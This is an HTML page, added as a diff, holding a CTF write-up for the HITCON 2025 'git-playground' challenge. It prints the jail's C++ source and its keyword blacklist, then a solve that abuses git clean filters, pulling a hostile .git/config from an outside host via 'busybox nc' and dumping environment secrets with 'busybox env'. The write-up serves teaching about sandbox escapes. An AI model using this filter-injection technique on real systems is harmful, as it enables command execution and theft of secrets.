@@ -1,0 +1,518 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-08-22-hitconctf2025/git-playground.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>git-playground - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#git-playground" class="nav-link">git-playground</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="git-playground">git-playground</h1>
+<pre class="highlight"><code>A simple git playground for you to test simple git commands.
+
+Note that everything in the sandbox are either from public releases, distro tarballs, or built from unmodified upstream source with common toolchains under normal architectures. Nothing strange and weird here.
+
+ssh -p 50087 root@git-playground.chal.hitconctf.com
+
+git-playground_-f59556b3c6f4b1106c530eb98c67e0d6ece14faf.tar.gz</code></pre>
+<p>Attachment:</p>
+<pre class="highlight"><code class="language-cpp">// jail.cpp
+#include &lt;algorithm&gt;
+#include &lt;cctype&gt;
+#include &lt;cstdlib&gt;
+#include &lt;errno.h&gt;
+#include &lt;filesystem&gt;
+#include &lt;fstream&gt;
+#include &lt;iostream&gt;
+#include &lt;ranges&gt;
+#include &lt;sstream&gt;
+#include &lt;string&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;vector&gt;
+
+using namespace std;
+
+void exec(char *const cmd[]) {
+  pid_t pid;
+  if ((pid = fork()) == 0) {
+    execvp(cmd[0], cmd);
+    perror("execution failed");
+    exit(1);
+  }
+  int status;
+  waitpid(pid, &amp;status, 0);
+}
+
+void exec(vector&lt;string&gt; &amp;args) {
+  vector&lt;char *&gt; cmd =
+      args | views::transform([](string &amp;s) -&gt; char * { return s.data(); }) |
+      ranges::to&lt;vector&lt;char *&gt;&gt;();
+  cmd.push_back(NULL);
+  exec(cmd.data());
+}
+
+void init() {
+  chdir("/work");
+  setenv("PATH", "/bin", 1);
+  setenv("SHELL", "/bin/sh", 1);
+  setenv("LESS", "-Rd", 1);
+  char *const git_init[] = {"git", "init", "-b", "main", NULL};
+  exec(git_init);
+  char *const git_config_email[] = {
+      "git", "config", "--global", "user.email", "hitconctf@hitcon.com", NULL};
+  exec(git_config_email);
+  char *const git_config_name[] = {"git",       "config",    "--global",
+                                   "user.name", "hitconctf", NULL};
+  exec(git_config_name);
+}
+
+void banner() {
+  cout &lt;&lt; "=====================================\n";
+  cout &lt;&lt; "Hello! Welcome to the Git playground!\n";
+  cout &lt;&lt; "=====================================\n";
+}
+
+vector&lt;string&gt; parse(const string &amp;cmd) {
+  stringstream ss(cmd);
+  vector&lt;string&gt; args;
+  string tmp;
+  while (ss &gt;&gt; tmp) {
+    args.push_back(move(tmp));
+  }
+  return args;
+}
+
+bool blacklist(const string &amp;cmd) {
+  string lst[] = {"sh"s, "env"s, "hook"s};
+  for (auto &amp;s : lst) {
+    if (cmd.find(s) != string::npos) {
+      return 1;
+    }
+  }
+  return 0;
+}
+
+bool check_printable_charset(const string &amp;s) {
+  for (char c : s) {
+    if (!isprint(c)) {
+      return 0;
+    }
+  }
+  return 1;
+}
+
+bool check_basic_charset(const string &amp;s) {
+  for (char c : s) {
+    if (!(isalnum(c) || c == ' ' || c == ',' || c == '.')) {
+      return 0;
+    }
+  }
+  return 1;
+}
+
+bool check_path_charset(const string &amp;s) {
+  for (char c : s) {
+    if (!(isalnum(c) || c == '.' || c == '/' || c == '_' || c == '-')) {
+      return 0;
+    }
+  }
+  return 1;
+}
+
+bool check_commit(const string &amp;s) {
+  if (s == "main" || s == "HEAD") {
+    return 1;
+  }
+  for (char c : s) {
+    if (!(isdigit(c) || (c &gt;= 'a' &amp;&amp; c &lt;= 'f'))) {
+      return 0;
+    }
+  }
+  return 1;
+}
+
+bool check_path_under_work(const string &amp;s) {
+  return check_path_charset(s) &amp;&amp; s[0] != '-' &amp;&amp;
+         filesystem::absolute(s).lexically_normal().string().starts_with(
+             "/work");
+}
+
+bool check(vector&lt;string&gt; &amp;args) {
+  if (args[0] == "git") {
+    if (args.size() == 1) {
+      return 1;
+    }
+    if (args[1] == "add") {
+      if (args.size() != 3) {
+        return 0;
+      }
+      return check_path_under_work(args[2]);
+    } else if (args[1] == "commit") {
+      if (args.size() &lt; 4 || args[2] != "-m") {
+        return 0;
+      }
+      string comment;
+      for (int i = 3; i &lt; (int)args.size(); i++) {
+        comment += move(args[i]) + " ";
+      }
+      comment.pop_back();
+      args.erase(args.begin() + 3, args.end());
+      args.push_back(move(comment));
+      return check_basic_charset(comment);
+    } else if (args[1] == "status") {
+      return args.size() == 2;
+    } else if (args[1] == "log" || args[1] == "diff") {
+      return args.size() == 2 ||
+             (args.size() == 3 &amp;&amp;
+              (check_path_under_work(args[2]) || check_commit(args[2])));
+    } else if (args[1] == "show") {
+      return args.size() == 2 || (args.size() == 3 &amp;&amp; check_commit(args[2]));
+    }
+  } else if (args[0] == "touch" || args[0] == "cat" || args[0] == "rm" ||
+             args[0] == "mkdir") {
+    return args.size() == 2 &amp;&amp; check_path_under_work(args[1]);
+  } else if (args[0] == "ls") {
+    return args.size() == 1 ||
+           (args.size() == 2 &amp;&amp; check_path_under_work(args[1]));
+  } else if (args[0] == "rmdir") {
+    return args.size() == 2 &amp;&amp; check_path_under_work(args[1]) &amp;&amp;
+           args[1] != "/work";
+  } else if (args[0] == "cp" || args[0] == "mv") {
+    return args.size() == 3 &amp;&amp; check_path_under_work(args[1]) &amp;&amp;
+           check_path_under_work(args[2]);
+  }
+  return 0;
+}
+
+int main() {
+  init();
+  banner();
+  while (true) {
+    cout &lt;&lt; "Enter your command: " &lt;&lt; flush;
+    string cmd;
+    if (!getline(cin, cmd)) {
+      break;
+    }
+    if (blacklist(cmd)) {
+      cout &lt;&lt; "Dont't try to hack me\n";
+      continue;
+    }
+    vector&lt;string&gt; args = parse(cmd);
+    if (args.empty()) {
+      continue;
+    }
+    if (args[0] == "cd" &amp;&amp; args.size() == 2 &amp;&amp; check_path_under_work(args[1])) {
+      chdir(args[1].data());
+    } else if (args[0] == "pwd" &amp;&amp; args.size() == 1) {
+      cout &lt;&lt; filesystem::current_path().lexically_relative("/work").string()
+           &lt;&lt; '\n';
+    } else if (args[0] == "echo") {
+      if (args.size() &gt;= 3) {
+        string write_path;
+        bool overwrite = 0;
+        if ((args[(int)args.size() - 2] == "&gt;" ||
+             args[(int)args.size() - 2] == "&gt;&gt;") &amp;&amp;
+            check_path_under_work(args[(int)args.size() - 1])) {
+          write_path = args.back();
+          args.pop_back();
+          if (args.back() == "&gt;") {
+            overwrite = 1;
+          }
+          args.pop_back();
+        }
+        string data;
+        for (int i = 1; i &lt; (int)args.size(); i++) {
+          data += move(args[i]) + " ";
+        }
+        data.pop_back();
+        if (!check_printable_charset(data)) {
+          cout &lt;&lt; "Invalid command\n";
+        } else if (write_path.empty()) {
+          cout &lt;&lt; data &lt;&lt; "\n";
+        } else {
+          ofstream ofs(write_path,
+                       ios::out | (overwrite ? ios::trunc : ios::app));
+          if (ofs.is_open()) {
+            ofs &lt;&lt; data &lt;&lt; "\n";
+            ofs.close();
+          } else {
+            cout &lt;&lt; "Error opening file\n";
+          }
+        }
+      }
+    } else if (check(args)) {
+      exec(args);
+    } else {
+      cout &lt;&lt; "Invalid command\n";
+    }
+  }
+  cout &lt;&lt; "Bye!\n";
+  return 0;
+}</code></pre>
+<pre class="highlight"><code class="language-shell"># run.sh
+#!/bin/bash
+
+# FLAG is in the environment variable
+
+rootdir="$(mktemp -d)"
+trap "{ rm -rf '$rootdir'; }" EXIT
+mkdir "$rootdir/bin"
+cp -a /chroot/bin "$rootdir"
+mkdir "$rootdir/root"
+mkdir "$rootdir/work"
+mkdir "$rootdir/dev"
+mknod "$rootdir/dev/null" c 1 3
+chmod 666 "$rootdir/dev/null"
+
+exec /chroot/bin/busybox sh -c "exec chroot '$rootdir' /bin/jail"</code></pre>
+<p>This is a sandbox where we cannot do many things. How to read environment variables? Steps:</p>
+<ol>
+<li>Use .gitattrbutes + .git/config using git filter to run custom command to bypass validation</li>
+<li>Pull .git/config from network to bypass <code>env</code> validation</li>
+<li>Trigger git filter again to run <code>busybox env</code></li>
+</ol>
+<p>First, prepare a VPS, write a file like this:</p>
+<pre class="highlight"><code class="language-config">[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[filter "test"]
+        clean = busybox env
+        smudge = cat</code></pre>
+<p>This will be downloaded by the sandbox, so a public IP is required. Use nc to serve it:</p>
+<pre class="highlight"><code class="language-shell"># run in background in VPS
+cat config | nc -l -p 2223 -v</code></pre>
+<p>Then, we download the config in the sandbox:</p>
+<pre class="highlight"><code class="language-shell">echo *.c filter=test &gt; .gitattributes
+echo [filter "test"] &gt;&gt; .git/config
+echo clean = busybox nc YOUR_PUBLIC_IP_HERE 2223 &gt; .git/config &gt;&gt; .git/config
+echo smudge = cat &gt;&gt; .git/config
+git add .gitattributes
+touch test.c
+git add .</code></pre>
+<p>The <code>.git/config</code> has been replaced by our file:</p>
+<pre class="highlight"><code class="language-shell">Enter your command: cat .git/config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[filter "test"]
+        clean = busybox env
+        smudge = cat</code></pre>
+<p>Now, trigger the git filter again:</p>
+<pre class="highlight"><code class="language-shell">touch test2.c
+git add .
+git diff</code></pre>
+<p>You can find the flag in output:</p>
+<pre class="highlight"><code class="language-diff">diff --git a/test2.c b/test2.c
+index 4e43e22..af90735 100644
+--- a/test2.c
++++ b/test2.c
+@@ -1,17 +0,0 @@
+-FLAG=hitcon{Bu5yb0X_34511y_cR4sH_Wh3N_bu117_w17h_C14Ng?}
+-SSH_CONNECTION=117.133.64.11 7895 10.10.0.18 22
+-PWD=/work
+-SHELL=/bin/sh
+-PATH=//libexec/git-core:/bin
+-TERM=xterm-256color
+-LOGNAME=root
+-GIT_PREFIX=</code></pre>
+<p>Solved.</p></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
